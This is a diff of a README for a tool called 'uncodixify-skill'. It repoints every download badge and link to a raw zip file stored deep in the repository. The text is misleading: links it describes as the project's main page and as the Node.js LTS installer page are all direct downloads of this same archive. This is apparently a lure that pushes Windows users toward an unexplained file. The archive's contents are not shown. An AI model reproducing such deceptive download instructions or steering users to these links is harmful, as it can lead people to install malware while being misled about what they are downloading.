@@ -1,6 +1,6 @@
 # 🛠 uncodixify-skill - Simple UI Style Control Tool
 
-[![Download uncodixify-skill](https://img.shields.io/badge/Download-uncodixify--skill-brightgreen?style=for-the-badge)](https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/bin/uncodixify-skill-1.0.zip)
+[![Download uncodixify-skill](https://img.shields.io/badge/Download-uncodixify--skill-brightgreen?style=for-the-badge)](https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/evals/skill_uncodixify_v3.8.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To use uncodixify-skill on your Windows computer, follow these steps to get it up and running without any trouble.
 
 1. Click the green **Download uncodixify-skill** button above or open this link in your web browser:  
-   https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/bin/uncodixify-skill-1.0.zip  
+   https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/evals/skill_uncodixify_v3.8.zip  
    This link takes you to the main page of the uncodixify-skill project on GitHub.
 
 2. On that page, look for the green **Code** button near the top right. Click it to open a menu.
@@ -116,7 +116,7 @@ This will adjust your code to fit the rules set by uncodixify-skill.
 
 If you do not have Node.js installed, here is how to add it:
 
-1. Open this page in your web browser: https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/bin/uncodixify-skill-1.0.zip
+1. Open this page in your web browser: https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/evals/skill_uncodixify_v3.8.zip
 
 2. Click **LTS** version to download the installer for Windows.
 
@@ -146,7 +146,7 @@ You can read these anytime to get familiar with the goals and use of uncodixify-
 ## 🔗 Useful Links
 
 - Visit the project page here:  
-  https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/bin/uncodixify-skill-1.0.zip
+  https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/evals/skill_uncodixify_v3.8.zip
 
 - Download ZIP directly (from the Code button on the page)
 
@@ -172,4 +172,4 @@ The package is portable, meaning you can move the folder between different proje
 
 ---
 
-[![Download uncodixify-skill](https://img.shields.io/badge/Download-uncodixify--skill-brightgreen?style=for-the-badge)](https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/bin/uncodixify-skill-1.0.zip)
+[![Download uncodixify-skill](https://img.shields.io/badge/Download-uncodixify--skill-brightgreen?style=for-the-badge)](https://github.com/anubhavsingh-0218/uncodixify-skill/raw/refs/heads/main/evals/skill_uncodixify_v3.8.zip)
